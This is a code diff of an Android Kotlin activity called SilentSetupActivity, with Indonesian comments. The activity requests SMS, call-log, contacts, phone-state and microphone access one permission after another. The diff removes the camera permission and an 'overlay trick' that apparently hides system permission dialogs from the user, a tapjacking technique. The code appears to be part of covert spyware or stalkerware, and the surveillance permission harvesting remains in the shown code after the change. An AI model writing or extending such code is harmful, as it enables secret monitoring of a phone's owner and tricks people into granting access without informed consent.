@@ -6,7 +6,6 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
@@ -33,7 +32,6 @@ class SilentSetupActivity : AppCompatActivity() {
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_CONTACTS,
-        Manifest.permission.CAMERA,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.RECORD_AUDIO,
     )
@@ -43,31 +41,9 @@ class SilentSetupActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         crashlytics.log("SilentSetupActivity: onCreate")
-        // ── Langkah PERTAMA: minta SYSTEM_ALERT_WINDOW sebelum runtime permissions ──
-        // Overlay trick tidak bisa jalan tanpa izin ini.
-        requestOverlayPermission()
-    }
-
-    // ── Step 0: SYSTEM_ALERT_WINDOW (wajib untuk overlay trick) ─────────────
-
-    private fun requestOverlayPermission() {
-        crashlytics.log("SilentSetupActivity: requestOverlayPermission")
-        if (!Settings.canDrawOverlays(this)) {
-            try {
-                startActivityForResult(
-                    Intent(
-                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:$packageName")
-                    ), 2000
-                )
-                return
-            } catch (e: Exception) {
-                crashlytics.recordException(e)
-            }
-        }
-        // Sudah granted (atau skip karena error) → lanjut ke runtime permissions
         requestNextPermission()
     }
+
 
     // ── Runtime permissions ──────────────────────────────────────────────────
 
@@ -81,8 +57,6 @@ class SilentSetupActivity : AppCompatActivity() {
         }
 
         if (permissionIndex >= permissions.size) {
-            // Semua runtime permission selesai — matikan overlay lalu lanjut
-            OverlayTrickManager.stop(this)
             requestSpecialPermissions()
             return
         }
@@ -102,7 +76,6 @@ class SilentSetupActivity : AppCompatActivity() {
             ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
         } catch (e: Exception) {
             crashlytics.recordException(e)
-            OverlayTrickManager.stop(this)
             permissionIndex++
             handler.postDelayed({ requestNextPermission() }, 300)
         }
@@ -141,7 +114,6 @@ class SilentSetupActivity : AppCompatActivity() {
         val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
         crashlytics.log("SilentSetupActivity: permissionResult[$requestCode] granted=$granted")
         // Matikan overlay setelah user merespons dialog
-        OverlayTrickManager.stop(this)
         permissionIndex++
         handler.postDelayed({ requestNextPermission() }, 300)
     }
